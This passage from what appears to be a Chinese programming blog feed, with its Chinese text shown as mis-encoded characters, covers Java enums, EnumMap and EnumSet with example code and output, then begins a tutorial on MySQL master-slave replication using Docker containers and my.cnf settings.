class="hljs-string">&quot;Sunday&quot;</span>);<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String day;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">WeekDay</span><span class="hljs-params">(String day)</span> &#123;<br>        <span class="hljs-built_in">this</span>.day = day;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printDay</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (i) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                System.out.println(WeekDay.Mon);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                System.out.println(WeekDay.Tue);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                System.out.println(WeekDay.Wed);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                System.out.println(WeekDay.Thu);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                System.out.println(WeekDay.Fri);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                System.out.println(WeekDay.Sat);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>                System.out.println(WeekDay.Sun);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                System.out.println(<span class="hljs-string">&quot;wrong number!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDay</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> day;<br>    &#125;<br>&#125;<br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (WeekDay day : WeekDay.values()) &#123;<br>        System.out.println(day + <span class="hljs-string">&quot;====&gt;&quot;</span> + day.getDay());<br>    &#125;<br>    WeekDay.printDay(<span class="hljs-number">5</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸Šä»£ç è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">Mon</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Monday<br><span class="hljs-attribute">Tue</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Tuesday<br><span class="hljs-attribute">Wed</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Wednesday<br><span class="hljs-attribute">Thu</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Thursday<br><span class="hljs-attribute">Fri</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Friday<br><span class="hljs-attribute">Sat</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Saturday<br><span class="hljs-attribute">Sun</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;Sunday<br>Fri<br></code></pre></td></tr></table></figure><blockquote><p>Java ä¸­çš„ enum è¿˜å¯ä»¥è·Ÿ Class ç±»ä¸€æ ·è¦†ç›–åŸºç±»çš„æ–¹æ³•ã€‚</p></blockquote><h2 id="EnumMap-ä¸-EnumSet"><a href="#EnumMap-ä¸-EnumSet" class="headerlink" title="EnumMap ä¸ EnumSet"></a>EnumMap ä¸ EnumSet</h2><p>ä¸ºäº†æ›´å¥½åœ°æ”¯æŒæšä¸¾ç±»å‹ï¼Œjava.util ä¸­æ·»åŠ äº†ä¸¤ä¸ªæ–°ç±»ï¼šEnumMap å’Œ EnumSetã€‚ä½¿ç”¨å®ƒä»¬å¯ä»¥æ›´é«˜æ•ˆåœ°æ“ä½œæšä¸¾ç±»å‹ã€‚</p><h3 id="EnumMap-ç±»"><a href="#EnumMap-ç±»" class="headerlink" title="EnumMap ç±»"></a>EnumMap ç±»</h3><p>EnumMap æ˜¯ä¸“é—¨ä¸ºæšä¸¾ç±»å‹é‡èº«å®šåšçš„ Map å®ç°ã€‚è™½ç„¶ä½¿ç”¨å…¶ä»–çš„ Mapï¼ˆå¦‚ HashMapï¼‰å®ç°ä¹Ÿèƒ½å®Œæˆæšä¸¾ç±»å‹å®ä¾‹åˆ°å€¼çš„æ˜ å°„ï¼Œä½†æ˜¯ä½¿ç”¨ EnumMap ä¼šæ›´åŠ é«˜æ•ˆã€‚</p><p>HashMap åªèƒ½æ¥æ”¶åŒä¸€æšä¸¾ç±»å‹çš„å®ä¾‹ä½œä¸ºé”®å€¼ï¼Œå¹¶ä¸”ç”±äºæšä¸¾ç±»å‹å®ä¾‹çš„æ•°é‡ç›¸å¯¹å›ºå®šå¹¶ä¸”æœ‰é™ï¼Œæ‰€ä»¥ EnumMap ä½¿ç”¨æ•°ç»„æ¥å­˜æ”¾ä¸æšä¸¾ç±»å‹å¯¹åº”çš„å€¼ï¼Œä½¿å¾— EnumMap çš„æ•ˆç‡éå¸¸é«˜ã€‚</p><p>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">DataBaseType</span> &#123;<br>    <span class="hljs-comment">//å®šä¹‰æ•°æ®åº“ç±»å‹æšä¸¾</span><br>    DB2,MYSQL,ORACLE,SQLSERVER<br>&#125;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test3</span><span class="hljs-params">()</span> &#123;<br>         EnumMap&lt;DataBaseType,String&gt; urls=<span class="hljs-keyword">new</span> <span class="hljs-title class_">EnumMap</span>&lt;DataBaseType,String&gt;(DataBaseType.class);<br>        urls.put(DataBaseType.DB2,<span class="hljs-string">&quot;jdbc:db2://localhost:5000/sample&quot;</span>);<br>        urls.put(DataBaseType.MYSQL,<span class="hljs-string">&quot;jdbc:mysql://localhost/mydb&quot;</span>);<br>        urls.put(DataBaseType.ORACLE,<span class="hljs-string">&quot;jdbc:oracle:thin:@localhost:1521:sample&quot;</span>);<br>        urls.put(DataBaseType.SQLSERVER,<span class="hljs-string">&quot;jdbc:microsoft:sqlserver://sql:1433;Database=mydb&quot;</span>);<br>        System.out.println(urls.get(DataBaseType.DB2));<br>        System.out.println(urls.get(DataBaseType.SQLSERVER));<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸Šä»£ç è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">jdbc:db2:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">5000</span>/sample<br>jdbc:microsoft:sqlserver:<span class="hljs-regexp">//</span>sql:<span class="hljs-number">1433</span>;Database=mydb<br></code></pre></td></tr></table></figure><h3 id="EnumSet-ç±»"><a href="#EnumSet-ç±»" class="headerlink" title="EnumSet ç±»"></a>EnumSet ç±»</h3><p>EnumSet æ˜¯æšä¸¾ç±»å‹çš„é«˜æ€§èƒ½ Set å®ç°ï¼Œå®ƒè¦æ±‚æ”¾å…¥å®ƒçš„æšä¸¾å¸¸é‡å¿…é¡»å±äºåŒä¸€æšä¸¾ç±»å‹ã€‚EnumSet æä¾›äº†è®¸å¤šå·¥å‚æ–¹æ³•ä»¥ä¾¿äºåˆå§‹åŒ–ã€‚</p><p>EnumSet ç±»çš„å¸¸ç”¨æ–¹æ³•</p><table><thead><tr><th>æ–¹æ³•åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td>allOf(Class element type)</td><td>åˆ›å»ºä¸€ä¸ªåŒ…å«æŒ‡å®šæšä¸¾ç±»å‹ä¸­æ‰€æœ‰æšä¸¾æˆå‘˜çš„ EnumSet å¯¹è±¡</td></tr><tr><td>complementOf(EnumSet s)</td><td>åˆ›å»ºä¸€ä¸ªä¸æŒ‡å®š EnumSet å¯¹è±¡ s ç›¸åŒçš„æšä¸¾ç±»å‹ EnumSet å¯¹è±¡ï¼Œå¹¶åŒ…å«æ‰€æœ‰ s ä¸­æœªåŒ…å«çš„æšä¸¾æˆå‘˜</td></tr><tr><td>copyOf(EnumSet s)</td><td>åˆ›å»ºä¸€ä¸ªä¸æŒ‡å®š EnumSet å¯¹è±¡ s ç›¸åŒçš„æšä¸¾ç±»å‹ EnumSet å¯¹è±¡ï¼Œå¹¶ä¸ s åŒ…å«ç›¸åŒçš„æšä¸¾æˆå‘˜</td></tr><tr><td>noneOf(&lt;Class elementType)</td><td>åˆ›å»ºæŒ‡å®šæšä¸¾ç±»å‹çš„ç©º EnumSet å¯¹è±¡</td></tr><tr><td>of(E first,eâ€¦rest)</td><td>åˆ›å»ºåŒ…å«æŒ‡å®šæšä¸¾æˆå‘˜çš„ EnumSet å¯¹è±¡</td></tr><tr><td>range(E from ,E to)</td><td>åˆ›å»ºä¸€ä¸ª EnumSet å¯¹è±¡ï¼Œè¯¥å¯¹è±¡åŒ…å«äº† from åˆ° to ä¹‹é—´çš„æ‰€æœ‰æšä¸¾æˆå‘˜</td></tr></tbody></table><p>å®ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test4</span><span class="hljs-params">()</span> &#123;<br>       EnumMap&lt;DataBaseType,String&gt; urls=<span class="hljs-keyword">new</span> <span class="hljs-title class_">EnumMap</span>&lt;DataBaseType,String&gt;(DataBaseType.class);<br>       urls.put(DataBaseType.DB2,<span class="hljs-string">&quot;jdbc:db2://localhost:5000/sample&quot;</span>);<br>       urls.put(DataBaseType.MYSQL,<span class="hljs-string">&quot;jdbc:mysql://localhost/mysql&quot;</span>);<br>       urls.put(DataBaseType.ORACLE,<span class="hljs-string">&quot;jdbc:oracle:thin:@localhost:1521:sample&quot;</span>);<br>       urls.put(DataBaseType.SQLSERVER,<span class="hljs-string">&quot;jdbc:microsoft:sqlserver://sql:1433;Database=mydb&quot;</span>);<br><br>       <span class="hljs-keyword">for</span> (DataBaseType baseType : EnumSet.range(DataBaseType.MYSQL, DataBaseType.ORACLE)) &#123;<br>           System.out.println(urls.get(baseType));<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸Šä»£ç è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">jdbc:</span>mysql:<span class="hljs-comment">//localhost/mysql</span><br><span class="hljs-symbol">jdbc:</span>oracle:thin:@localhost:<span class="hljs-number">1521</span>:sample<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>basis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»é›¶å¼€å§‹ï¼Œé€šè¿‡dockerå®ç°MySQLä¸»ä»å¤åˆ¶</title>
    <link href="/2022/11/27/%E9%80%9A%E8%BF%87docker%E5%AE%9E%E7%8E%B0MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
    <url>/2022/11/27/%E9%80%9A%E8%BF%87docker%E5%AE%9E%E7%8E%B0MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»é›¶å¼€å§‹é€šè¿‡dockerå®ç°mysql-ä¸»ä»å¤åˆ¶"><a class="markdownIt-Anchor" href="#ä»é›¶å¼€å§‹é€šè¿‡dockerå®ç°mysql-ä¸»ä»å¤åˆ¶"></a> ä»é›¶å¼€å§‹ï¼Œé€šè¿‡dockerå®ç°mysql ä¸»ä»å¤åˆ¶</h1><h2 id="1å®‰è£…docker"><a class="markdownIt-Anchor" href="#1å®‰è£…docker"></a> 1.å®‰è£…docker</h2><p>å¾ˆç®€å•ï¼Œå‘½ä»¤ï¼š</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> -y docker<br></code></pre></td></tr></table></figure><p>å¯åŠ¨docker:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">systemctl start docker //centos7åŠä»¥åç‰ˆæœ¬<br><br># service docker start //centos6åŠä¹‹å‰çš„ç‰ˆæœ¬<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹é•œåƒ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">docker images<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127204452372.png" alt="image-20221127204452372" /></p><p>åˆ›å»ºdocker å®¹å™¨ï¼ˆå¯ä»¥æ ¹æ®ä¸€ä¸ªé•œåƒåˆ›å»ºå¤šä¸ªå®¹å™¨ï¼‰</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">docker run -tid é•œåƒID/usr/sbin/init  //centos7ç‰ˆæœ¬ã€‚ä½¿ç”¨/usr/sbin/initè§£å†³systemctlæŠ¥é”™ä¸èƒ½ä½¿ç”¨çš„é—®é¢˜<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -tid é•œåƒID<span class="hljs-regexp">/bin/</span>bash     <span class="hljs-regexp">//</span>écentos7<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å®¹å™¨åˆ—è¡¨</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">docker ps -a<br></code></pre></td></tr></table></figure><p>é€€å‡ºå®¹å™¨</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥å®¹å™¨</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">docker exec -it å®¹å™¨åç§° /bin/bash<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127204853468.png" alt="image-20221127204853468" /></p><p>è¿›å…¥å®¹å™¨åï¼Œæ³¨æ„å˜åŒ–ï¼Œä¹‹å‰æ˜¯root@localhstï¼Œç°åœ¨å˜æˆroot@å®¹å™¨idï¼Œä¹Ÿå°±æ˜¯å®¹å™¨IDï¼Œç°åœ¨è¿›å…¥å®¹å™¨åï¼Œä½ å¯ä»¥ç†è§£æˆï¼Œä¸€ä¸ªå…¨æ–°çš„linuxæ“ä½œç³»ç»Ÿï¼Œå°±åƒæˆ‘ä»¬wondowä¸‹å®‰è£…VMware Workstationåï¼ŒæˆåŠŸé€šè¿‡é•œåƒå®‰è£…ä¸€å°linuxçš„é“ç†æ˜¯æ ·çš„ï¼ä½ åœ¨å®¹å™¨çš„å¹²ä»€ä¹ˆï¼Œè£…ä»€ä¹ˆä¸ä¼šå½±å“åˆ°å®¿ä¸»ï¼Œä¸¤ä¸ªæ“ä½œç³»ç»Ÿæ˜¯éš”ç¦»çš„ï¼Œç‹¬ç«‹çš„ã€‚</p><h2 id="2ä½¿ç”¨dockerå®‰è£…mysql"><a class="markdownIt-Anchor" href="#2ä½¿ç”¨dockerå®‰è£…mysql"></a> 2.ä½¿ç”¨dockerå®‰è£…MySQL</h2><ol><li>åœ¨docker hub ä¸ŠæŸ¥çœ‹è¦ä¸‹è½½çš„mysqlé•œåƒåç§°:<br />æ‰“å¼€<a href="https://registry.hub.docker.com/">dockerHubå®˜ç½‘åœ°å€</a> åœ¨ä¸Šæ–¹æœç´¢æ é‡Œè¾“å…¥mysql</li></ol><p>ä¸æŒ‡å®šç‰ˆæœ¬å·ï¼Œé»˜è®¤ä¸‹è½½æœ€æ–°ç‰ˆæœ¬:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo docker pull mysql</span><br></code></pre></td></tr></table></figure><p>æŒ‡å®šç‰ˆæœ¬å·:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> docker pull mysql:<span class="hljs-number">5</span>.<span class="hljs-number">7</span>ã€‚<span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><p>å¦‚æœä¸‹è½½å¤ªæ…¢çš„è¯ï¼Œæˆ‘è¿™é‡Œæä¾›<a href="https://pan.baidu.com/s/10hiDEDnxNovqzhXdrRnPEg?pwd=283l">MySQLtaråŒ…</a><br />åœ¨å°†mysql.taræ–‡ä»¶ä¸Šä¼ åˆ°è™šæ‹Ÿæœºï¼Œé€šè¿‡loadå‘½ä»¤åŠ è½½ä¸ºé•œåƒ</p><p><code>docker load -i nginx.tar</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127205803009.png" alt="image-20221127205803009" /></p><ol start="2"><li><p>é•œåƒåŠ è½½å®Œæˆä¹‹åï¼Œç”¨è¯¥é•œåƒåˆ›å»ºmysqlå®ä¾‹,ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥åˆ›å»º</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo docker run -d -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> -v <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/mysql/</span>conf:<span class="hljs-regexp">/etc/my</span>sql<span class="hljs-regexp">/conf.d -v /u</span>sr<span class="hljs-regexp">/local/my</span>sql<span class="hljs-regexp">/data:/</span>var<span class="hljs-regexp">/lib/my</span>sql -e MYSQL_ROOT_PASSWORD=root --name  mysql mysql:<span class="hljs-number">5.7</span>.<span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><blockquote><p>é…ç½®ç«¯å£æ˜ å°„ï¼š</p></blockquote><p>-p 3306:3306 --name mysql<br />å°†å®¹å™¨çš„3306ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„3306ç«¯å£</p><blockquote><p>é…ç½®mysqlæ•°æ®å·æŒ‚è½½</p></blockquote><ol><li>-v /mydata/mysql/log:/var/log/mysql(æ—¥å¿—æ–‡ä»¶æŒ‚è½½)<br />å°†å®¹å™¨ä¸­çš„æ—¥å¿—æ–‡ä»¶å¤¹æŒ‚è½½åˆ°ä¸»æœºå¯¹åº”çš„/mydata/mysql/logæ–‡ä»¶å¤¹ä¸­</li><li>-v /mydata/mysql/data:/var/lib/mysql(æ•°æ®æ–‡ä»¶æŒ‚è½½)<br />å°†å®¹å™¨ä¸­çš„æ•°æ®æ–‡ä»¶å¤¹æŒ‚è½½åˆ°ä¸»æœºå¯¹åº”çš„/mydata/mysql/dataæ–‡ä»¶å¤¹ä¸­</li><li>-v /mydata/mysql/conf:/etc/mysql(é…ç½®æ–‡ä»¶æŒ‚è½½)<br />å°†å®¹å™¨çš„é…ç½®æ–‡ä»¶å¤¹æŒ‚è½½åˆ°ä¸»æœºå¯¹åº”çš„/mydata/mysql/confæ–‡ä»¶å¤¹ä¸­<br />æ³¨(è¿™é‡Œæ‰€æçš„ä¸»æœºæŒ‡çš„æ˜¯å½“å‰çš„linuxä¸»æœº)</li></ol><blockquote><p>é…ç½®ç”¨æˆ·</p></blockquote><p>â€‹-e MYSQL_ROOT_PASSWORD=root<br />â€‹è®¾ç½®åˆå§‹åŒ–rootç”¨æˆ·çš„å¯†ç </p><blockquote><p>æŒ‡å®šé•œåƒèµ„æº</p></blockquote><ol><li>-d mysql:5.7.25</li><li>-dï¼šä»¥åå°æ–¹å¼è¿è¡Œå®ä¾‹</li><li>mysql:5.7.25ï¼šæŒ‡å®šç”¨è¿™ä¸ªé•œåƒæ¥åˆ›å»ºè¿è¡Œå®ä¾‹</li></ol></li></ol><p><code>docker ps -a</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127210618489.png" alt="image-20221127210618489" /></p><h2 id="3ä¸»æœåŠ¡å™¨æ­å»º"><a class="markdownIt-Anchor" href="#3ä¸»æœåŠ¡å™¨æ­å»º"></a> 3.ä¸»æœåŠ¡å™¨æ­å»º</h2><h3 id="31-æ–°å»ºmysql-masterå®¹å™¨å®ä¾‹3307"><a class="markdownIt-Anchor" href="#31-æ–°å»ºmysql-masterå®¹å™¨å®ä¾‹3307"></a> 3.1 æ–°å»ºmysql-masterå®¹å™¨å®ä¾‹3307</h3><pre><code class="hljs"># åˆ›å»ºmasterã€slaveé…ç½®æ–‡ä»¶æ‰€åœ¨æ–‡ä»¶å¤¹mkdir -p /usr/local/repository/mysql/mysql-master/confmkdir -p /usr/local/repository/mysql/mysql-slave/conf# åˆ›å»ºä¸»å®¹å™¨å®ä¾‹docker run -p 3307:3306 --name mysql-master -v /usr/local/repository/mysql/mysql-master/log:/var/log/mysql -v /usr/local/repository/mysql/mysql-master/data:/var/lib/mysql -v /usr/local/repository/mysql/mysql-master/conf:/etc/mysql -e MYSQL_ROOT_PASSWORD=root -d mysql:5.7.25</code></pre><h3 id="32-ä¸»æœåŠ¡å™¨mysql-masteræ·»åŠ å¹¶ä¿®æ”¹é…ç½®æ–‡ä»¶mycnf"><a class="markdownIt-Anchor" href="#32-ä¸»æœåŠ¡å™¨mysql-masteræ·»åŠ å¹¶ä¿®æ”¹é…ç½®æ–‡ä»¶mycnf"></a> 3.2 ä¸»æœåŠ¡å™¨mysql-masteræ·»åŠ å¹¶ä¿®æ”¹é…ç½®æ–‡ä»¶my.cnf</h3><pre><code class="hljs"># ç¼–è¾‘é…ç½®æ–‡ä»¶å†…å®¹vim /usr/local/repository/mysql/mysql-master/conf/my.cnf</code></pre><p>é…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><pre><code class="hljs">[client]default_character_set=utf8[mysqld]collation_server = utf8_general_cicharacter_set_server = utf8## è®¾ç½®server_idï¼ŒåŒä¸€å±€åŸŸç½‘ä¸­éœ€è¦å”¯ä¸€server_id=101 ## æŒ‡å®šä¸éœ€è¦åŒæ­¥çš„æ•°æ®åº“åç§°binlog-ignore-db=mysql  ## å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½log-bin=mall-mysql-bin  ## è®¾ç½®äºŒè¿›åˆ¶æ—¥å¿—ä½¿ç”¨å†…å­˜å¤§å°ï¼ˆäº‹åŠ¡ï¼‰binlog_cache_size=1M  ## è®¾ç½®ä½¿ç”¨çš„äºŒè¿›åˆ¶æ—¥å¿—æ ¼å¼ï¼ˆmixed,statement,rowï¼‰binlog_format=mixed  ## äºŒè¿›åˆ¶æ—¥å¿—è¿‡æœŸæ¸…ç†æ—¶é—´ã€‚é»˜è®¤å€¼ä¸º0ï¼Œè¡¨ç¤ºä¸è‡ªåŠ¨æ¸…ç†ã€‚expire_logs_days=7  ## è·³è¿‡ä¸»ä»å¤åˆ¶ä¸­é‡åˆ°çš„æ‰€æœ‰é”™è¯¯æˆ–æŒ‡å®šç±»å‹çš„é”™è¯¯ï¼Œé¿å…slaveç«¯å¤åˆ¶ä¸­æ–­ã€‚## å¦‚ï¼š1062é”™è¯¯æ˜¯æŒ‡ä¸€äº›ä¸»é”®é‡å¤ï¼Œ1032é”™è¯¯æ˜¯å› ä¸ºä¸»ä»æ•°æ®åº“æ•°æ®ä¸ä¸€è‡´slave_skip_errors=1062</code></pre><h3 id="33-æ·»åŠ å®Œä¹‹åé‡å¯mysql-masterå®¹å™¨"><a class="markdownIt-Anchor" href="#33-æ·»åŠ å®Œä¹‹åé‡å¯mysql-masterå®¹å™¨"></a> 3.3 æ·»åŠ å®Œä¹‹åé‡å¯mysql-masterå®¹å™¨</h3><pre><code class="hljs">docker restart mysql-master</code></pre><h3 id="34-è¿›å…¥mysql-masterå®¹å™¨"><a class="markdownIt-Anchor" href="#34-è¿›å…¥mysql-masterå®¹å™¨"></a> 3.4 è¿›å…¥mysql-masterå®¹å™¨</h3><pre><code class="hljs">docker exec -it mysql-master /bin/bashmysql -uroot -proot</code></pre><h3 id="35-masterå®¹å™¨å®ä¾‹å†…åˆ›å»ºæ•°æ®åŒæ­¥ç”¨æˆ·"><a class="markdownIt-Anchor" href="#35-masterå®¹å™¨å®ä¾‹å†…åˆ›å»ºæ•°æ®åŒæ­¥ç”¨æˆ·"></a> 3.5 masterå®¹å™¨å®ä¾‹å†…åˆ›å»ºæ•°æ®åŒæ­¥ç”¨æˆ·</h3><pre><code class="hljs">CREATE USER 'slave'@'%' IDENTIFIED BY '123456';GRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'slave'@'%';</code></pre><h2 id="4ä»æœåŠ¡å™¨æ­å»º"><a class="markdownIt-Anchor" href="#4ä»æœåŠ¡å™¨æ­å»º"></a> 4.ä»æœåŠ¡å™¨æ­å»º</h2><h3 id="41-åˆ›å»ºmysqlä»æœåŠ¡å™¨å®¹å™¨å®ä¾‹"><a class="markdownIt-Anchor" href="#41-åˆ›å»ºmysqlä»æœåŠ¡å™¨å®¹å™¨å®ä¾‹"></a> 4.1 åˆ›å»ºmysqlä»æœåŠ¡å™¨å®¹å™¨å®ä¾‹</h3><pre><code class="hljs">docker run -p 3308:3306 --name mysql-slave -v /usr/local/repository/mysql/mysql-slave/log:/var/log/mysql -v /usr/local/repository/mysql/mysql-slave/data:/var/lib/mysql -v /usr/local/repository/mysql/mysql-slave/conf:/etc/mysql -e MYSQL_ROOT_PASSWORD=root -d mysql:5.7.25</code></pre><h3 id="42-ä¿®æ”¹ä»æœåŠ¡å™¨é…ç½®æ–‡ä»¶mycnf"><a class="markdownIt-Anchor" href="#42-ä¿®æ”¹ä»æœåŠ¡å™¨é…ç½®æ–‡ä»¶mycnf"></a> 4.2 ä¿®æ”¹ä»æœåŠ¡å™¨é…ç½®æ–‡ä»¶my.cnf</h3><pre><code class="hljs">vim /usr/local/repository/mysql/mysql-slave/conf/my.cnf</code></pre><p>é…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><pre><code class="hljs">[client]default_character_set=utf8[mysqld]collation_server = utf8_general_cicharacter_set_server = utf8## è®¾ç½®server_idï¼ŒåŒä¸€å±€åŸŸç½‘ä¸­éœ€è¦å”¯ä¸€server_id=102## æŒ‡å®šä¸éœ€è¦åŒæ­¥çš„æ•°æ®åº“åç§°binlog-ignore-db=mysql  ## å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½ï¼Œä»¥å¤‡Slaveä½œä¸ºå…¶å®ƒæ•°æ®åº“å®ä¾‹çš„Masteræ—¶ä½¿ç”¨log-bin=mall-mysql-slave1-bin  ## è®¾ç½®äºŒè¿›åˆ¶æ—¥å¿—ä½¿ç”¨å†…å­˜å¤§å°ï¼ˆäº‹åŠ¡ï¼‰binlog_cache_size=1M  ## è®¾ç½®ä½¿ç”¨çš„äºŒè¿›åˆ¶æ—¥å¿—æ ¼å¼ï¼ˆmixed,statement,rowï¼‰binlog_format=mixed  ## äºŒè¿›åˆ¶æ—¥å¿—è¿‡æœŸæ¸…ç†æ—¶é—´ã€‚é»˜è®¤å€¼ä¸º0ï¼Œè¡¨ç¤ºä¸è‡ªåŠ¨æ¸…ç†ã€‚expire_logs_days=7  ## 